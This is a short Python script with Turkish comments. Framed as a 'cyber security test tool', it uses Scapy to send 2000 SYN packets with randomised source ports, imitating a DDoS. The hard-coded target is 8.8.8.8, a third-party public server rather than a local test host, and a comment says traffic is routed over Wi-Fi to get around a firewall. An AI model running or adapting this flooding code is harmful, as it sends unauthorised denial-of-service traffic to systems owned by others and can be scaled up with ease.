from scapy.all import IP, TCP, send
import time
import random

def tcp_saldirisi_simulasyonu(hedef_ip, hedef_port, paket_sayisi):
    print(f"[{hedef_ip}:{hedef_port}] adresine {paket_sayisi} adet GERCEK saldiri paketi (Scapy NDIS) gonderiliyor...")
    print("Bu cok genis ve uzun suren bir DDoS simulasynudur.")
    print("Lutfen C# arayuzundeki sayaclarin nasil costugunu izleyin!\n")
    
    # Gercek bir DDoS saldirganinin yapacagi gibi, her pakette kaynak portunu
    # rastgele seciyoruz ki motor bunlari binlerce farkli baglanti (DDoS) olarak algilasin!
    for i in range(paket_sayisi):
        sport = random.randint(1024, 65535)
        paket = IP(dst=hedef_ip) / TCP(sport=sport, dport=hedef_port, flags="S")
        send(paket, verbose=0)
        
        if (i + 1) % 100 == 0:
            print(f"> {i + 1} paket firlatildi...")
    
    print("\nSaldiri gonderimi tamamlandi! Lutfen C# Arayuzunuzu kontrol edin.")

if __name__ == "__main__":
    # Guvenlik duvarini asmak icin Wi-Fi uzerinden disari cikiyoruz
    HEDEF_IP = "8.8.8.8" 
    PORT = 80
    PAKET_SAYISI = 2000
    
    print("--- SIBER GUVENLIK TEST ARACI (UZUN SURELI DDoS) ---")
    print("Geri sayim basliyor... C# uygulamanizin acik ve calisiyor oldugundan emin olun!")
    for i in range(3, 0, -1):
        print(f"{i}...")
        time.sleep(1)
        
    tcp_saldirisi_simulasyonu(HEDEF_IP, PORT, PAKET_SAYISI)
